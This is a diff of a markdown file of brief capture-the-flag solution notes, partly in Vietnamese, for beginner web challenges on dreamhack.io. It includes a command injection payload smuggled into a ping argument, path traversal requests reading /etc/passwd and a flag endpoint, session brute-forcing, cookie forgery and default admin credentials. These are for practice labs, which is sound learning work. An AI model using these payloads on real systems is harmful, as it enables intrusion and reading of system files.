@@ -1,33 +1,34 @@
 # dreamhack.io
-## php7cmp4re
+## Beginner
+### php7cmp4re
 ```
 input1=7.:&inpit2=7:
 ```
-## phpreg
+### phpreg
 ```
 step1: input1=dnyanyangng0310&input2=1@43319!+1+13 
 step2: cat /../dream/*
 ```
-## ex-reg-ex
+### ex-reg-ex
 ```
 import re
 i = "drabcdde123am@xyz.com"
 m = re.match(r'dr\w{5,7}e\d+am@[a-z]{3,7}\.\w+', i)
 print(m)
 ```
-## Flying Chars
+### Flying Chars
 - Read src for win
-## simple-web-request
+### simple-web-request
 - Read src and request for win
 
 ![image](https://github.com/user-attachments/assets/07441982-8730-4cdc-9491-e224b34fb5e9)
 
 ![image](https://github.com/user-attachments/assets/e46ec44a-fb38-41af-b5e5-b6834625743e)
 
-## devtools-sources
+### devtools-sources
 - Dont need devtools i need a penguin
 ```grep -r "DH{" *```
-## session
+### session
 
 - Ở đây server phân biệt người dùng này với người dùng khác qua session_id. 
 - Tuy nhiên độ dài của nó khá ngắn nên chúng ta có thể bf ra được.
@@ -54,20 +55,20 @@ Connection: keep-alive
 
 ![image](https://github.com/user-attachments/assets/b7f2f260-2c44-427b-8f80-e6d8a63472f4)
 
-## Carve Party
+### Carve Party
 - Click bằng tay đi.
 ```js
 for(i=0; i<=10000; i++){
  $('#jack-target').trigger("click")
 }
 ```
-## web-misconf-1
+### web-misconf-1
 - config quên xóa default password
 ```
 user: admin
 pass: admin
 ```
-## command-injection-1
+### command-injection-1
 - Server chạy subprocess nhưng không kiểm tra đầu vào của input:
 ```
 ping -c 3 "{input}"
@@ -75,5 +76,21 @@ ping -c 3 "{input}"
 -> ping -c 3 ""; cat *; echo ""
 ```
 
-## 
-
+### file-download-1
+- không cần care phần upload đâu, đọc src sẽ thấy ```/read``` bị lỗi path traversal.
+```
+http://host3.dreamhack.games:24186/read?name=../../../../etc/passwd
+tự thêm phần mà bạn muốn đọc vào để solve :v
+```
+### pathtraversal
+- tương tự câu trên nhưng lần này là ở POST data.
+```
+ const users = {
+    'guest': 0,
+    'admin': 1
+  }
+userid=1/../../../api/flag
+```
+### cookie
+```Cookie: sessionid=6c292920; username=admin```
+## level 1
